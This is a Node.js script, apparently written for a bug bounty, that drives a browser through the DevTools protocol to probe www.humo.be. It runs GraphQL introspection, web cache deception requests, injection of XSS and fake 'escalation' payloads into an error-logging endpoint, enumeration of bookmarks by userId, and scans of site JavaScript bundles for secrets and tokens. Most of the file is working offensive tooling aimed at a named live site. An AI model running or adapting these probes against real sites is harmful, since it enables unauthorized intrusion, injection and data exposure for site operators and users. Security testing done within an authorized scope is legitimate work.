// humo_remaining_angles.js — hit every remaining angle before submission.
// GraphQL GET, cache deception, error injection, article XSS, chunk mining.
const http = require('http');
const fs = require('fs');
const path = require('path');
const DIR = path.join(__dirname, '..', 'findings', 'bounties', 'humo-h1');

function getJSON(p) {
  return new Promise((r, j) => {
    http.get({ host: '127.0.0.1', port: 9223, path: p }, c => {
      let d = '';
      c.on('data', x => d += x);
      c.on('end', () => r(JSON.parse(d)));
    }).on('error', j);
  });
}

function cdp(ws, m, p = {}) {
  return new Promise((r, j) => {
    const id = Math.floor(Math.random() * 1e9);
    const t = setTimeout(() => j(new Error('timeout')), 12000);
    const h = evt => {
      const msg = JSON.parse(evt.data);
      if (msg.id === id) { clearTimeout(t); ws.removeEventListener('message', h); msg.error ? j(new Error(JSON.stringify(msg.error))) : r(msg.result); }
    };
    ws.addEventListener('message', h);
    ws.send(JSON.stringify({ id, method: m, params: p }));
  });
}

async function main() {
  const targets = await getJSON('/json');
  let tab = targets.find(t => t.type === 'page');
  const ws = new WebSocket(tab.webSocketDebuggerUrl);
  await new Promise(r => ws.onopen = r);

  await cdp(ws, 'Page.enable');
  await cdp(ws, 'Runtime.enable');
  await cdp(ws, 'Network.enable');

  const evalAsync = async (expr) => {
    const r = await cdp(ws, 'Runtime.evaluate', {
      expression: '(async () => { ' + expr + ' })()',
      awaitPromise: true, returnByValue: true
    });
    return r.result.value;
  };

  var results = {};
  await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
  await new Promise(r => setTimeout(r, 6000));

  // ===== 1. GraphQL via GET =====
  console.log('=== 1. GraphQL GET introspection ===');
  var gql1 = await evalAsync(
    'var r=await fetch("https://www.humo.be/graphql?query={__schema{types{name,fields{name}}}");' +
    'return r.status+" | ct="+r.headers.get("content-type")+" | "+(await r.text()).slice(0,500);'
  );
  console.log('  ' + gql1);
  results.gql_get = gql1;
  await new Promise(r => setTimeout(r, 2000));

  // Try with __typename
  var gql2 = await evalAsync(
    'var r=await fetch("https://www.humo.be/graphql?query={__typename}");' +
    'return r.status+" | "+(await r.text()).slice(0,300);'
  );
  console.log('  __typename: ' + gql2);
  results.gql_typename = gql2;
  await new Promise(r => setTimeout(r, 2000));

  // Try Altair-style
  var gql3 = await evalAsync(
    'var r=await fetch("https://www.humo.be/graphql",__proto__={method:"GET"});' +
    'return r.status+" | "+(await r.text()).slice(0,200);'
  );
  console.log('  GET basic: ' + gql3);
  await new Promise(r => setTimeout(r, 2000));

  // ===== 2. CACHE DECEPTION =====
  console.log('\n=== 2. Cache deception ===');
  var cacheTests = [
    '/magazine/test article~b12345.json',
    '/magazine/test article~b12345',
    '/_next/data/fcfb6998eb14/magazine.json',
    '/api/_next-api/bookmarks?userId=1.json',
    '/api/_next-api/bookmarks?userId=1&_data=/api/_next-api/bookmarks',
    '/zoeken?q=test&_data=/zoeken',
    '/;/',
    '/api/_next-api/bookmarks?userId=1#',
  ];
  for (var i = 0; i < cacheTests.length; i++) {
    var cr = await evalAsync(
      'var r=await fetch("https://www.humo.be' + cacheTests[i] + '");' +
      'return r.status+" | ct="+r.headers.get("content-type")+" | "+r.headers.get("x-nextjs-cache")+" | "+(await r.text()).slice(0,100);'
    );
    console.log('  ' + cacheTests[i] + ': ' + cr);
    results['cache_' + i] = cr;
    await new Promise(r => setTimeout(r, 2000));
  }

  // ===== 3. ERROR MONITORING INJECTION =====
  console.log('\n=== 3. Error monitoring injection ===');
  var errPayloads = [
    '{"message":"test","stack":"Error at test","url":"https://www.humo.be/test"}',
    '{"message":"<script>alert(1)</script>","stack":"xss","url":"https://www.humo.be/xss"}',
    '{"userId":1,"message":"admin","stack":"escalation","url":"https://www.humo.be/admin"}',
  ];
  for (var e = 0; e < errPayloads.length; e++) {
    var er = await evalAsync(
      'var r=await fetch("https://www.humo.be/api/_next-api/v1/error",{method:"POST",' +
      'headers:{"Content-Type":"application/json"},body:' + JSON.stringify(errPayloads[e]) + '});' +
      'return r.status+" | "+(await r.text()).slice(0,200);'
    );
    console.log('  payload[' + e + ']: ' + er);
    results['err_' + e] = er;
    await new Promise(r => setTimeout(r, 2000));
  }

  // ===== 4. ARTICLE XSS =====
  console.log('\n=== 4. Article content XSS test ===');
  // Navigate to a known article from the sitemap
  var article = await evalAsync(
    'var r=await fetch("https://www.humo.be/sitemap.xml");' +
    'var t=await r.text();' +
    'var match=t.match(/<loc>(https:\\/\\/www\\.humo\\.be\\/[^<]+)<\\/loc>/);' +
    'return match?match[1]:"no article found";'
  );
  console.log('  first article: ' + article);

  if (article && article !== 'no article found') {
    // Navigate to article
    await cdp(ws, 'Page.navigate', { url: article });
    await new Promise(r => setTimeout(r, 6000));

    // Check for innerHTML / dangerouslySetInnerHTML in rendered content
    var xssCheck = await evalAsync(
      'var content=document.querySelector("article, .article, .content, main");' +
      'if(!content) return "no article container";' +
      'var html=content.innerHTML;' +
      'var r=[];' +
      'r.push("length:"+html.length);' +
      'r.push("innerHTML:"+((html.match(/innerHTML/g)||[]).length));' +
      'r.push("eval:"+((html.match(/eval\\(/g)||[]).length));' +
      'r.push("script:"+((html.match(/<script/gi)||[]).length));' +
      'r.push("onerror:"+((html.match(/onerror/gi)||[]).length));' +
      'r.push("href:"+((html.match(/href=javascript:/gi)||[]).length));' +
      'return r.join(", ");'
    );
    console.log('  article XSS check: ' + xssCheck);
    results.article_xss = xssCheck;

    // Check for reflected parameters in article page
    var reflected = await evalAsync(
      'var url=new URL(window.location.href);' +
      'var r=[];' +
      'r.push("url:"+url.href.slice(0,100));' +
      'r.push("title:"+document.title.slice(0,50));' +
      'return r.join("; ");'
    );
    console.log('  article meta: ' + reflected);
  }

  // ===== 5. BUILD MANIFEST CHUNK MINING =====
  console.log('\n=== 5. Chunk mining ===');
  await cdp(ws, 'Page.navigate', { url: 'https://www.humo.be' });
  await new Promise(r => setTimeout(r, 5000));

  var chunks = await evalAsync(
    'var scripts=Array.from(document.querySelectorAll("script[src*=\\"_next\\"]"));' +
    'return scripts.map(function(s){return s.src;}).join("\\n");'
  );
  var chunkList = chunks.split('\n').filter(function(s) { return s.length > 0; });
  console.log('  found ' + chunkList.length + ' chunks');

  // Download first 3 chunks and look for secrets
  for (var c = 0; c < Math.min(3, chunkList.length); c++) {
    var chunkContent = await evalAsync(
      'var r=await fetch("' + chunkList[c] + '");' +
      'var t=await r.text();' +
      'var findings=[];' +
      'if(t.match(/api[_-]?key|apiKey|API_KEY/i)) findings.push("API_KEY");' +
      'if(t.match(/secret|SECRET/i)) findings.push("SECRET");' +
      'if(t.match(/password|PASSWORD/i)) findings.push("PASSWORD");' +
      'if(t.match(/token|TOKEN/i)) findings.push("TOKEN");' +
      'if(t.match(/graphql|GRAPHQL/i)) findings.push("GRAPHQL");' +
      'if(t.match(/localStorage|sessionStorage/i)) findings.push("STORAGE");' +
      'if(t.match(/innerHTML/gi)) findings.push("INNERHTML:"+((t.match(/innerHTML/g)||[]).length));' +
      'return findings.length?findings.join(","):"clean | size:"+t.length;'
    );
    console.log('  chunk ' + c + ': ' + chunkContent);
    results['chunk_' + c] = chunkContent;
    await new Promise(r => setTimeout(r, 2000));
  }

  // ===== 6. CHECK RATE LIMIT BOUNDARY =====
  console.log('\n=== 6. Rate limit boundary (exact) ===');
  var rl = [];
  for (var k = 0; k < 8; k++) {
    var rr = await evalAsync(
      'var r=await fetch("https://www.humo.be/api/_next-api/bookmarks?userId=' + (k+1) + '");' +
      'return r.status;'
    );
    rl.push(rr);
    await new Promise(r => setTimeout(r, 1500));
  }
  console.log('  ' + rl.join(', '));
  results.rl_boundary = rl.join(',');

  fs.writeFileSync(path.join(DIR, 'remaining_angles_results.json'), JSON.stringify(results, null, 2));
  console.log('\n=== All saved ===');
  ws.close();
}

main().catch(function(e) { console.error(e); process.exit(1); });
